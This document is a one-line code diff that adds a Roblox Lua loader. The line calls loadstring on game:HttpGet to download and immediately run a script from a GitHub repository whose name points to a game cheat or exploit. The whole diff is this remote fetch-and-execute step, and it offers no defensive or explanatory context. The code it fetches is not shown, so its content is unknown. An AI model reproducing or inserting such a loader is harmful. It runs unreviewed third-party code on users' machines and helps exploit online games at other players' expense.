@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/WinterDinder/Easy-Obby-Fucker/main/Main",true))()
